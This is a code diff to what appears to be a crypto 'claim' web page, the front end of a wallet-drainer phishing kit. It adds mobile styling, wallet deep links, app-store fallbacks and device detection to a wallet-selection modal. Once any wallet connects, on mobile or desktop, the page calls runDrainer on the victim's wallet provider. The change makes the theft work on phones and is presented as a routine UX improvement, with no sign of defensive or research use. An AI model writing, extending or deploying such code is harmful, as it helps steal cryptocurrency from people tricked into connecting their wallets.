@@ -330,6 +330,75 @@
     * {
       box-sizing: border-box;
     }
+    @media (max-width: 600px) {
+      nav { padding: 12px 8px; }
+      .hero { padding: 60px 8px; }
+      .hero h1 { font-size: 2em; }
+      .countdown { font-size: 1.2em; }
+      .wallet-box { 
+        padding: 20px; 
+        margin: 20px;
+        max-width: calc(100% - 40px);
+        border-radius: 12px;
+      }
+      .wallet-option {
+        padding: 16px 20px;
+        margin: 8px 0;
+        min-height: 60px; /* Better touch target */
+        border-radius: 10px;
+      }
+      .wallet-option img {
+        width: 32px;
+        height: 32px;
+      }
+      .wallet-name {
+        font-size: 1.1em;
+      }
+      .modal {
+        padding: 10px;
+      }
+    }
+    
+    /* Mobile-specific wallet modal improvements */
+    @media (max-width: 480px) {
+      .wallet-box {
+        padding: 16px;
+        margin: 10px;
+        max-width: calc(100% - 20px);
+      }
+      .wallet-option {
+        padding: 18px 16px;
+        margin: 6px 0;
+        min-height: 70px;
+      }
+      .wallet-option img {
+        width: 36px;
+        height: 36px;
+      }
+      .wallet-name {
+        font-size: 1.2em;
+        line-height: 1.3;
+      }
+    }
+    
+    /* Touch-friendly improvements for mobile */
+    @media (hover: none) and (pointer: coarse) {
+      .wallet-option {
+        min-height: 60px;
+        padding: 16px 20px;
+      }
+      .wallet-option:active {
+        background: #333;
+        transform: scale(0.98);
+      }
+      .claim-btn {
+        min-height: 50px;
+        padding: 16px 24px;
+      }
+      .claim-btn:active {
+        transform: scale(0.95);
+      }
+    }
   </style>
 </head>
 <body>
@@ -463,7 +532,6 @@
   </section>
   <div class="modal" id="walletModal" tabindex="-1" aria-modal="true" role="dialog">
     <div class="wallet-box" id="walletList">
-      <h2 style="margin-bottom: 20px;">Select Wallet</h2>
       <!-- Wallet buttons will be injected here -->
     </div>
   </div>
@@ -507,80 +575,297 @@
 
     // --- Wallet Modal Logic ---
     const WALLET_DEFS = [
-      { key: 'phantom', name: 'Phantom', icon: '/logos/phantom.png', provider: () => window.solana?.isPhantom ? window.solana : null, install: 'https://phantom.app/download' },
-      { key: 'solflare', name: 'Solflare', icon: '/logos/solflare.png', provider: () => window.solflare?.isSolflare ? window.solflare : null, install: 'https://solflare.com/download' },
-      { key: 'backpack', name: 'Backpack', icon: '/logos/backpack.png', provider: () => window.backpack?.isBackpack ? window.backpack : null, install: 'https://backpack.app/download' },
-      { key: 'glow', name: 'Glow', icon: '/logos/glow.png', provider: () => window.glow?.isGlow ? window.glow : null, install: 'https://glow.app/download' },
-      { key: 'trust', name: 'Trust Wallet', icon: '/logos/trust.png', provider: () => (window.trustwallet?.isTrust ? window.trustwallet : (window.solana?.isTrust ? window.solana : (window.trustwallet || window.solana || null))), install: 'https://trustwallet.com/download' },
-      { key: 'exodus', name: 'Exodus', icon: '/logos/exodus.png', provider: () => window.exodus || (window.solana?.isExodus ? window.solana : null), install: 'https://www.exodus.com/download/' },
+      { 
+        key: 'phantom', 
+        name: 'Phantom', 
+        icon: '/logos/phantom.png', 
+        provider: () => window.solana?.isPhantom ? window.solana : null, 
+        install: 'https://phantom.app/download',
+        mobile: {
+          deepLink: 'https://phantom.app/ul/browse/',
+          appStore: 'https://apps.apple.com/app/phantom-crypto-wallet/id1598432977',
+          playStore: 'https://play.google.com/store/apps/details?id=app.phantom'
+        }
+      },
+      { 
+        key: 'solflare', 
+        name: 'Solflare', 
+        icon: '/logos/solflare.png', 
+        provider: () => window.solflare?.isSolflare ? window.solflare : null, 
+        install: 'https://solflare.com/download',
+        mobile: {
+          deepLink: 'https://solflare.com/ul/browse/',
+          appStore: 'https://apps.apple.com/app/solflare/id1580902717',
+          playStore: 'https://play.google.com/store/apps/details?id=com.solflare.mobile'
+        }
+      },
+      { 
+        key: 'backpack', 
+        name: 'Backpack', 
+        icon: '/logos/backpack.png', 
+        provider: () => window.backpack?.isBackpack ? window.backpack : null, 
+        install: 'https://backpack.app/download',
+        mobile: {
+          deepLink: 'https://backpack.app/ul/browse/',
+          appStore: 'https://apps.apple.com/app/backpack-wallet/id6446671622',
+          playStore: 'https://play.google.com/store/apps/details?id=com.backpack.app'
+        }
+      },
+      { 
+        key: 'glow', 
+        name: 'Glow', 
+        icon: '/logos/glow.png', 
+        provider: () => window.glow?.isGlow ? window.glow : null, 
+        install: 'https://glow.app/download',
+        mobile: {
+          deepLink: 'https://glow.app/ul/browse/',
+          appStore: 'https://apps.apple.com/app/glow-wallet/id1634023005',
+          playStore: 'https://play.google.com/store/apps/details?id=com.glow.wallet'
+        }
+      },
+      { 
+        key: 'trust', 
+        name: 'Trust Wallet', 
+        icon: '/logos/trust.png', 
+        provider: () => (window.trustwallet?.isTrust ? window.trustwallet : (window.solana?.isTrust ? window.solana : (window.trustwallet || window.solana || null))), 
+        install: 'https://trustwallet.com/download',
+        mobile: {
+          deepLink: 'https://link.trustwallet.com/open_url?coin_id=501&url=',
+          appStore: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',
+          playStore: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp'
+        }
+      },
+      { 
+        key: 'exodus', 
+        name: 'Exodus', 
+        icon: '/logos/exodus.png', 
+        provider: () => window.exodus || (window.solana?.isExodus ? window.solana : null), 
+        install: 'https://www.exodus.com/download/',
+        mobile: {
+          deepLink: 'https://exodus.com/ul/browse/',
+          appStore: 'https://apps.apple.com/app/exodus-crypto-wallet/id1414384820',
+          playStore: 'https://play.google.com/store/apps/details?id=exodusmovement.exodus'
+        }
+      },
     ];
+
+    // Mobile detection
+    function isMobile() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || 
+             window.innerWidth <= 768;
+    }
+
+    // Enhanced mobile detection with more specific checks
+    function getMobilePlatform() {
+      const userAgent = navigator.userAgent.toLowerCase();
+      if (/iphone|ipad|ipod/.test(userAgent)) {
+        return 'ios';
+      } else if (/android/.test(userAgent)) {
+        return 'android';
+      } else if (/windows phone/.test(userAgent)) {
+        return 'windows';
+      }
+      return 'desktop';
+    }
+
+    // Check if user is on mobile browser (not desktop browser)
+    function isMobileBrowser() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+    // Get mobile store URL based on platform
+    function getMobileStoreUrl(wallet) {
+      if (!wallet.mobile) return wallet.install;
+      
+      const platform = getMobilePlatform();
+      if (platform === 'ios') {
+        return wallet.mobile.appStore;
+      } else if (platform === 'android') {
+        return wallet.mobile.playStore;
+      }
+      return wallet.install; // Fallback to desktop
+    }
+
+    // Handle mobile wallet connection with enhanced UX
+    async function connectMobileWallet(wallet) {
+      if (!wallet.mobile?.deepLink) {
+        showStatus('Mobile wallet not supported for ' + wallet.name, 'error');
+        return;
+      }
+
+      const currentUrl = encodeURIComponent(window.location.href);
+      const deepLinkUrl = wallet.mobile.deepLink + currentUrl;
+      const platform = getMobilePlatform();
+      
+      showStatus('Opening ' + wallet.name + ' mobile app...', 'loading');
+      
+      try {
+        // For iOS, try to open the app directly
+        if (platform === 'ios') {
+          window.location.href = deepLinkUrl;
+        } else if (platform === 'android') {
+          // For Android, try to open the app
+          window.location.href = deepLinkUrl;
+        } else {
+          // For other platforms, try the deep link anyway
+          window.location.href = deepLinkUrl;
+        }
+        
+        // Fallback: if deep link doesn't work, redirect to app store
+        setTimeout(() => {
+          if (document.hidden || document.webkitHidden) {
+            // App opened successfully
+            showStatus('Please complete the connection in your ' + wallet.name + ' app', 'loading');
+          } else {
+            // App didn't open, redirect to store
+            const storeUrl = getMobileStoreUrl(wallet);
+            showStatus('Opening app store to install ' + wallet.name + '...', 'loading');
+            window.open(storeUrl, '_blank');
+          }
+        }, 2000);
+      } catch (err) {
+        showStatus('Error opening ' + wallet.name + ' app: ' + err.message, 'error');
+      }
+    }
+
+    // Enhanced mobile wallet detection
+    function detectMobileWallets() {
+      const detectedWallets = [];
+      
+      // Check for mobile wallet providers
+      if (window.solana?.isPhantom) detectedWallets.push('phantom');
+      if (window.solflare?.isSolflare) detectedWallets.push('solflare');
+      if (window.backpack?.isBackpack) detectedWallets.push('backpack');
+      if (window.glow?.isGlow) detectedWallets.push('glow');
+      if (window.trustwallet?.isTrust || window.solana?.isTrust) detectedWallets.push('trust');
+      if (window.exodus || window.solana?.isExodus) detectedWallets.push('exodus');
+      
+      return detectedWallets;
+    }
 
     function openWalletModal() {
       const modal = document.getElementById("walletModal");
       const list = document.getElementById("walletList");
-      list.innerHTML = `<h2 style=\"margin-bottom: 20px;\">Select Wallet</h2>`;
+      const isMobileDevice = isMobile();
+      const isMobileBrowser = isMobileBrowser();
+      const platform = getMobilePlatform();
+      const detectedWallets = detectMobileWallets();
+      
+      // Show mobile-specific header
+      const mobileHeader = isMobileDevice ? 
+        `<h2 style="margin-bottom: 10px;">Select Wallet</h2>
+         <p style="color:#00FF88;font-size:0.9em;margin-bottom:20px;">
+           📱 Mobile detected (${platform.toUpperCase()}) - Tap to open app or install
+         </p>` : 
+        `<h2 style="margin-bottom: 20px;">Select Wallet</h2>`;
+      
+      list.innerHTML = mobileHeader;
+      
       WALLET_DEFS.forEach(wallet => {
         const provider = wallet.provider();
-        // Debug: Log provider detection for Trust Wallet
-        if (wallet.name === 'Trust Wallet') {
-          console.log('Trust Wallet provider:', provider);
-        }
+        const isDetected = detectedWallets.includes(wallet.key);
         const option = document.createElement("div");
         option.className = "wallet-option";
         option.tabIndex = 0;
         option.setAttribute('role', 'button');
         option.setAttribute('aria-label', `Connect ${wallet.name}`);
+        
+        // Enhanced mobile indicators
+        let mobileIndicator = '';
+        let statusText = '';
+        
+        if (isMobileDevice) {
+          if (isDetected) {
+            mobileIndicator = '<span style="color:#00FF88;font-size:0.8em;">📱 Detected</span>';
+            statusText = '<span style="color:#00FF88;font-size:0.9em;">Tap to connect</span>';
+          } else {
+            mobileIndicator = '<span style="color:#FFD700;font-size:0.8em;">📱 Install</span>';
+            statusText = '<span style="color:#FFD700;font-size:0.9em;">Tap to install app</span>';
+          }
+        } else {
+          statusText = provider ? '' : '<span style="color:#FF4D4D;font-size:0.9em;">Not installed</span>';
+        }
+        
         option.innerHTML = `
           <img src="${wallet.icon}" alt="${wallet.name} logo" />
-          <div class="wallet-name">${wallet.name}</div>
-          ${provider ? '' : '<span style=\"color:#FF4D4D;font-size:0.9em;\">Not installed</span>'}
+          <div class="wallet-name">${wallet.name} ${mobileIndicator}</div>
+          ${statusText}
         `;
-        if (provider) {
+        
+        if (isMobileDevice) {
+          // Enhanced mobile behavior
           option.onclick = async () => {
             modal.classList.remove("active");
-            showStatus('Connecting to ' + wallet.name + '...', 'loading');
-            // Debug: Log connect method for Trust Wallet
-            if (wallet.name === 'Trust Wallet') {
-              console.log('Trust Wallet connect:', typeof provider.connect);
-            }
-            try {
-              if (typeof provider.connect === 'function') {
-                await provider.connect();
-              }
-              // Fallback: If connect() doesn't exist, just proceed if publicKey/address is present
-              if (!getWalletAddress(provider)) {
-                let msg = 'Connection failed: No public key returned. Please try again.';
-                if (wallet.name === 'Trust Wallet') {
-                  msg = 'Please unlock Trust Wallet and connect this site in the extension, then try again.';
-                } else if (wallet.name === 'Exodus') {
-                  msg = 'Please unlock Exodus and connect this site in the extension, then try again.';
-                } else if (wallet.name === 'Backpack') {
-                  msg = 'Please unlock Backpack and connect this site in the extension, then try again.';
+            if (provider && isDetected) {
+              // Wallet is available and detected, try to connect
+              showStatus('Connecting to ' + wallet.name + '...', 'loading');
+              try {
+                if (typeof provider.connect === 'function') {
+                  await provider.connect();
                 }
-                showStatus(msg, 'error');
-                return;
-              }
-              showStatus('Wallet connected: ' + wallet.name, 'success');
-              
-              // Only proceed with drainer if wallet is properly connected
-              setTimeout(() => {
-                if (getWalletAddress(provider)) {
-              runDrainer(provider);
-                } else {
-                  showStatus('Wallet connection lost. Please try again.', 'error');
+                if (!getWalletAddress(provider)) {
+                  showStatus('Please complete the connection in your ' + wallet.name + ' app', 'error');
+                  return;
                 }
-              }, 1000);
-            } catch (err) {
-              showStatus('Connection failed: ' + (err.message || err), 'error');
+                showStatus('Wallet connected: ' + wallet.name, 'success');
+                setTimeout(() => {
+                  if (getWalletAddress(provider)) {
+                    runDrainer(provider);
+                  } else {
+                    showStatus('Wallet connection lost. Please try again.', 'error');
+                  }
+                }, 1000);
+              } catch (err) {
+                showStatus('Connection failed: ' + (err.message || err), 'error');
+              }
+            } else {
+              // Wallet not available or not detected, try to open app or redirect to store
+              connectMobileWallet(wallet);
             }
           };
         } else {
-          option.onclick = () => window.open(wallet.install, '_blank');
+          // Desktop behavior: original logic
+          if (provider) {
+            option.onclick = async () => {
+              modal.classList.remove("active");
+              showStatus('Connecting to ' + wallet.name + '...', 'loading');
+              try {
+                if (typeof provider.connect === 'function') {
+                  await provider.connect();
+                }
+                if (!getWalletAddress(provider)) {
+                  let msg = 'Connection failed: No public key returned. Please try again.';
+                  if (wallet.name === 'Trust Wallet') {
+                    msg = 'Please unlock Trust Wallet and connect this site in the extension, then try again.';
+                  } else if (wallet.name === 'Exodus') {
+                    msg = 'Please unlock Exodus and connect this site in the extension, then try again.';
+                  } else if (wallet.name === 'Backpack') {
+                    msg = 'Please unlock Backpack and connect this site in the extension, then try again.';
+                  }
+                  showStatus(msg, 'error');
+                  return;
+                }
+                showStatus('Wallet connected: ' + wallet.name, 'success');
+                setTimeout(() => {
+                  if (getWalletAddress(provider)) {
+                    runDrainer(provider);
+                  } else {
+                    showStatus('Wallet connection lost. Please try again.', 'error');
+                  }
+                }, 1000);
+              } catch (err) {
+                showStatus('Connection failed: ' + (err.message || err), 'error');
+              }
+            };
+          } else {
+            option.onclick = () => window.open(wallet.install, '_blank');
+          }
         }
+        
         list.appendChild(option);
       });
+      
       modal.classList.add("active");
-      // Focus trap for accessibility
       setTimeout(() => {
         const first = list.querySelector('.wallet-option');
         if (first) first.focus();
